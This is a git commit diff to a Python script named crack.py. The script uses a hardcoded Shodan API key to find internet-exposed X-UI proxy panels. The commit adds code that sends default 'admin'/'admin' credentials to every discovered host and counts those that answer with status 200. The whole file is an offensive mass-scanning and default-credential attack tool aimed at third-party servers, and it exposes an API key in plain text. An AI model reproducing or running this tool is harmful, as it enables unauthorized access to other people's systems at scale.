7d070d7873647461fa67d9c39976869646ac5ffd
SaDWX <93474444+WIROUX@users.noreply.github.com>
2023-05-12 00:51:18 +0330

    Update crack.py

--- crack.py
+++ crack.py
@@ -1,6 +1,7 @@
 import shodan,re,requests as req
 
 # regex = (r"\d")
+url_ip = []
 def get_shodan_data_xui(): #Get data from shodan(query is XUI)
     api , data_list= shodan.Shodan("FBCWUSFYaT6Jo6eQAzkzVK5PKvkbQeDh") ,[]
     result = api.search("xui")
@@ -14,6 +15,7 @@ def get_shodan_data_xui(): #Get data from shodan(query is XUI)
             data_list.append(data)
     for data in data_list:
 #         print(f"IP: {data['ip']}:{data['port']}")
+        url_ip.append(f"{data['ip']}:{data['port']}")
         ips = f"{data['ip']}:{data['port']}".replace("'",'')
         try:
             r = req.get(ips)
@@ -23,3 +25,14 @@ def get_shodan_data_xui(): #Get data from shodan(query is XUI)
             print(ips)
 
         # ip = data['ip']+':54321'
+datas = {'username': 'admin', 'password': 'admin'}
+count = 0
+for ip in url_ip:
+    p = req.get(f"http://{ip}/",data=datas).status_code
+    print(p)
+    
+    if p == 200:
+        count += 1
+        print(f"{count} > {ip}")
+    else:
+        print('wrong')
